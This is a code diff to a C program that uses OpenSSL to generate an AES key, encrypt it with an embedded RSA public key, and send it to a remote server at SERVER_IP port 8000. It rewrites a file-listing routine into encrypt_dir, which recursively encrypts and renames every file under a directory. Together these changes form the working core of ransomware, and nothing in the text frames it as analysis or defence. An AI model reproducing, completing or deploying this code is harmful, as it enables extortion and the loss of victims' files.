@@ -2,6 +2,8 @@
 #include <stdlib.h>
 #include "encrypt.h"
 
+char *key_string = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyNl06yD3rVUwGEtIzwc0iD7/evDhmoPSBKv5iZvo+jJef5N43FnkSizahJmx1qf0fxtavhefjQDsf130crtk17b0nmX+nHtTVsMXbAKdKMott+2AdT55UbovW7NgRAgWlGqW0DyLadsbK+VirzN3sGDkYA7ASUHiatWudZu+S+dn+IvqsRLPg5vzQFCTW7v/O/V0K2B/ZL2AOA6EYNNrTU5KQK4kvepYfxXAqr8cEUV+BqvkEMWjTHwbfqffikrpjkqtfJQJRATuHohUIxwTUP92zNze6DJfVM2tz8qpQAltK3sxMsRfLNzq15pUIp2oXR7VfnSxTPBJ96kayrGT+QIDAQAB\n-----END PUBLIC KEY-----";
+
 void handleErrors(const char *error) {
     fprintf(stderr, "Erreur : %s\n", error);
     exit(EXIT_FAILURE);
@@ -10,33 +12,35 @@ void handleErrors(const char *error) {
 char *base64_encode(const unsigned char *input, int length){
     int output_length = 4 * ((length + 2) / 3);
     char *encoded = malloc(output_length + 1);
-    if (!encoded) return NULL;
+    if(!encoded) return NULL;
 
     EVP_EncodeBlock((unsigned char *)encoded, input, length);
     return encoded;
 }
 
-void encrypt_aes_key(const char *public_key_file, unsigned char *aes_key, unsigned char *encrypted_key, size_t *encrypted_key_len){
+void encrypt_aes_key(unsigned char *aes_key, unsigned char *encrypted_key, size_t *encrypted_key_len){
     EVP_PKEY *pkey;
     EVP_PKEY_CTX *ctx;
-    FILE *pub_file = fopen(public_key_file, "rb");
-    if (!pub_file) handleErrors("fopen (clé publique)");
-    pkey = PEM_read_PUBKEY(pub_file, NULL, NULL, NULL);
-    fclose(pub_file);
-    if (!pkey) handleErrors("PEM_read_PUBKEY");
+    BIO *bio = NULL;
+    bio = BIO_new_mem_buf(key_string, -1);
+    if(!bio) handleErrors("BIO_new_mem_buf");
+    pkey = PEM_read_bio_PUBKEY(bio, NULL, NULL, NULL);
+
+    if(!pkey) handleErrors("PEM_read_PUBKEY");
 
     ctx = EVP_PKEY_CTX_new(pkey, NULL);
-    if (!ctx) handleErrors("EVP_PKEY_CTX_new");
+    if(!ctx) handleErrors("EVP_PKEY_CTX_new");
 
-    if (EVP_PKEY_encrypt_init(ctx) <= 0) handleErrors("EVP_PKEY_encrypt_init");
-    if (EVP_PKEY_CTX_set_rsa_padding(ctx, RSA_PKCS1_OAEP_PADDING) <= 0) handleErrors("EVP_PKEY_CTX_set_rsa_padding");
+    if(EVP_PKEY_encrypt_init(ctx) <= 0) handleErrors("EVP_PKEY_encrypt_init");
+    if(EVP_PKEY_CTX_set_rsa_padding(ctx, RSA_PKCS1_OAEP_PADDING) <= 0) handleErrors("EVP_PKEY_CTX_set_rsa_padding");
 
-    if (EVP_PKEY_encrypt(ctx, NULL, encrypted_key_len, aes_key, AES_KEY_SIZE) <= 0) handleErrors("EVP_PKEY_encrypt");
+    if(EVP_PKEY_encrypt(ctx, NULL, encrypted_key_len, aes_key, AES_KEY_SIZE) <= 0) handleErrors("EVP_PKEY_encrypt");
 
-    if (EVP_PKEY_encrypt(ctx, encrypted_key, encrypted_key_len, aes_key, AES_KEY_SIZE) <= 0) handleErrors("EVP_PKEY_encrypt");
+    if(EVP_PKEY_encrypt(ctx, encrypted_key, encrypted_key_len, aes_key, AES_KEY_SIZE) <= 0) handleErrors("EVP_PKEY_encrypt");
 
     EVP_PKEY_CTX_free(ctx);
     EVP_PKEY_free(pkey);
+    BIO_free(bio);
 }
 
 unsigned char *create_key(void){
@@ -45,31 +49,35 @@ unsigned char *create_key(void){
     unsigned char encrypted_key[256];
     size_t encrypted_key_len;
     char *base64_key_aes;
+    char url[100];
+    snprintf(url, sizeof(url), "http://%s:8000/aes-encryption-key", SERVER_IP);
 
     RAND_bytes(aes_key, AES_KEY_SIZE);
     RAND_bytes(iv, AES_BLOCK_SIZE);
 
-    encrypt_aes_key("./config/public.pem", aes_key, encrypted_key, &encrypted_key_len);
+    encrypt_aes_key(aes_key, encrypted_key, &encrypted_key_len);
 
     base64_key_aes = base64_encode((const unsigned char *)encrypted_key, encrypted_key_len);
-    send_aes_key(base64_key_aes);
+    send_data("aes_key", base64_key_aes, url);
     free(base64_key_aes);
 
     return aes_key;
-    //encrypt_file("plaintext.txt", "encrypted.dat", aes_key, iv);
 }
 
-void encrypt_file(const char *filepath, unsigned char *aes_key) {
+void encrypt_file(const char *filepath, unsigned char *aes_key){
     char new_filepath[256];
     unsigned char iv[AES_BLOCK_SIZE];
     unsigned char buffer[CHUNK_SIZE] = {0};
     EVP_CIPHER_CTX *ctx;
     size_t read_bytes;
-    unsigned char ciphertext[CHUNK_SIZE + AES_BLOCK_SIZE]; // Prévoir padding
+    unsigned char ciphertext[CHUNK_SIZE + AES_BLOCK_SIZE];
     int len, ciphertext_len;
 
     FILE *file = fopen(filepath, "rb+");
-    if (!file) handleErrors("fopen");
+    if(!file){
+        fprintf(stderr, "Erreur fopen: %s\n", filepath);
+        return;
+    }
     
     RAND_bytes(iv, AES_BLOCK_SIZE);
     
@@ -93,25 +101,24 @@ void encrypt_file(const char *filepath, unsigned char *aes_key) {
     rename(filepath, new_filepath);
 }
 
-void list_files(const char *base_path){
+void encrypt_dir(const char *base_path, unsigned char *aes_key){
     struct dirent *dp;
     char path[1024];
     struct stat path_stat;
     DIR *dir = opendir(base_path);
 
-    if (!dir) return;
+    if(!dir) return;
 
-    while ((dp = readdir(dir)) != NULL) {
-        if (strcmp(dp->d_name, ".") == 0 || strcmp(dp->d_name, "..") == 0)
+    while((dp = readdir(dir)) != NULL){
+        if(strcmp(dp->d_name, ".") == 0 || strcmp(dp->d_name, "..") == 0)
             continue;
         
         snprintf(path, sizeof(path), "%s/%s", base_path, dp->d_name);
         stat(path, &path_stat);
-        if (S_ISDIR(path_stat.st_mode)) {
-            printf("[Dossier] %s\n", path);
-            list_files(path);
-        } else {
-            printf("[Fichier] %s\n", path);
+        if(S_ISDIR(path_stat.st_mode)){
+            encrypt_dir(path, aes_key);
+        }else{
+            encrypt_file(path, aes_key);
         }
     }
     closedir(dir);
